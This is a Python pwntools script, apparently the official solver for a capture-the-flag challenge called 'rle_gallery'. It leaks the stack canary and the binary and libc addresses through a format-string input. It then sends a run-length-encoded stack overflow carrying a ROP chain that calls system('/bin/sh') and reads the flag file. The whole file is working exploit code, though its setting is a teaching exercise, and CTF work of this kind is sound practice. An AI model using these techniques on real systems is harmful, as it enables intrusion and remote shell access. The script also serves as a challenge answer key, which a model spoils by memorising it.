#!/usr/bin/env python3

import argparse
import re
from pathlib import Path

from pwn import ELF, ROP, context, flat, p64, remote


HERE = Path(__file__).resolve().parent
PREVIEW_TITLE_OFFSET = 0x133C
RESTORE_OWNER_OFFSET = 0x153B
CANARY_OFFSET = 104
RETURN_OFFSET = 120
FLAG_RE = re.compile(rb"(?:kctf\{flag\}|KCTF\{[0-9a-f]{64}\})")


def encode_rle(decoded: bytes) -> bytes:
    """Encode arbitrary bytes as non-zero (count, byte) pairs."""
    encoded = bytearray()
    cursor = 0

    while cursor < len(decoded):
        count = 1
        while (
            cursor + count < len(decoded)
            and decoded[cursor + count] == decoded[cursor]
            and count < 255
        ):
            count += 1
        encoded.extend((count, decoded[cursor]))
        cursor += count

    if len(encoded) > 512 or len(encoded) % 2:
        raise ValueError("encoded payload does not fit the service protocol")
    return bytes(encoded)


def main() -> None:
    parser = argparse.ArgumentParser(description="official rle_gallery solver")
    parser.add_argument("host")
    parser.add_argument("port", type=int)
    options = parser.parse_args()

    context.clear(arch="amd64", os="linux")
    context.log_level = "error"

    binary_path = HERE / "rle_gallery"
    libc_path = HERE / "libc.so.6"
    binary = ELF(str(binary_path), checksec=False)
    libc = ELF(str(libc_path), checksec=False)
    io = remote(options.host, options.port)

    # These three values are produced by the same process that later decodes
    # the RLE stream, so their ASLR values remain valid for the overflow.
    io.sendlineafter(b"Title> ", b"%11$p|%12$p|%13$p")
    io.recvuntil(b"Preview: ")
    leak_line = io.recvline().strip()
    try:
        canary, preview_address, printf_address = (
            int(field, 16) for field in leak_line.split(b"|")
        )
    except (TypeError, ValueError) as error:
        raise SystemExit(f"unexpected leak line: {leak_line!r}") from error

    binary.address = preview_address - PREVIEW_TITLE_OFFSET
    libc.address = printf_address - libc.symbols["printf"]
    if canary & 0xff or binary.address & 0xfff or libc.address & 0xfff:
        raise SystemExit("leaks failed their canary/base alignment checks")

    libc_rop = ROP(libc)
    pop_rdi = libc_rop.find_gadget(["pop rdi", "ret"])
    if pop_rdi is None:
        raise SystemExit("required gadgets were not found in the supplied libc")

    restore_owner = binary.address + RESTORE_OWNER_OFFSET
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]
    libc_exit = libc.symbols["_exit"]

    # The first overwritten RIP is the privilege restoration helper. It has an
    # explicit realigning prologue so it is safe to enter directly by ret.
    chain = flat(
        restore_owner,
        pop_rdi.address,
        bin_sh,
        system,
        pop_rdi.address,
        0,
        libc_exit,
    )
    decoded = b"A" * CANARY_OFFSET + p64(canary) + b"B" * 8 + chain
    if len(decoded) <= RETURN_OFFSET:
        raise AssertionError("ROP chain did not reach the saved return address")
    encoded = encode_rle(decoded)

    io.sendlineafter(b"RLE byte length> ", str(len(encoded)).encode())
    io.sendafter(b"RLE bytes> ", encoded)
    io.recvuntil(b"Stored.\n")
    io.sendline(b"cat /home/pwn/flag")
    io.sendline(b"exit")
    response = io.recvrepeat(3)

    match = FLAG_RE.search(response)
    if match is None:
        raise SystemExit(f"flag not found in response: {response!r}")
    print(match.group().decode())


if __name__ == "__main__":
    main()
